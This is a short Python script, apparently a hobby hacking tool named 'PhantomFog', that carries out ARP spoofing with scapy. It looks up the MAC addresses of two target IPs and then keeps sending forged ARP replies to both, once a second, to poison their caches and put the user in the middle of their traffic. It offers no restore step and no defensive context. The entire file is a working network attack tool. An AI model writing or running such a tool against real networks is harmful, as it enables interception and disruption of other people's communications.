import scapy.all as scapy
import time
import pyfiglet
import argparse
import sys

def get_Argument() :
    parser = argparse.ArgumentParser()
    parser.add_argument("-t1", "--target1", dest="target_ip", help="Choose target ip")
    parser.add_argument("-t2", "--target2", dest="spoof_ip", help="Choose spoof ip")
    options = parser.parse_args()
    if not options.target_ip or not options.spoof_ip:
        sys.exit("Please specify both target_ip and spoof_ip. use --help for more information.")
    return options


def get_Mac(ip):
    arp_Request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_Request_broadcast = broadcast / arp_Request
    answered_List = scapy.srp(arp_Request_broadcast, timeout=1, verbose=False)[0]
    return answered_List[0][1].hwsrc

def spoof (target_ip , spoof_ip) :
    target_mac = get_Mac(target_ip)
    packet = scapy.ARP (op=2 , pdst=target_ip , hwdst = target_mac , psrc = spoof_ip)
    scapy.send(packet , verbose=False)
    #scapy.send(packet)


if __name__ == "__main__" :

    banner = pyfiglet.figlet_format("PhantomFog")
    print(banner)

    options = get_Argument()
    nbre_of_packet = 0
    try :
        while True:
            spoof(options.target_ip,options.spoof_ip)
            spoof(options.spoof_ip,options.target_ip)
            nbre_of_packet = nbre_of_packet + 2
            print("\r[+] ARP Packets send " , nbre_of_packet,end="")
            time.sleep(1)
    except KeyboardInterrupt :
        print("\n[+] Detected CTRL + C ... Please wait !! ")
        #time.sleep(2)
        print("Quitting Successfully")

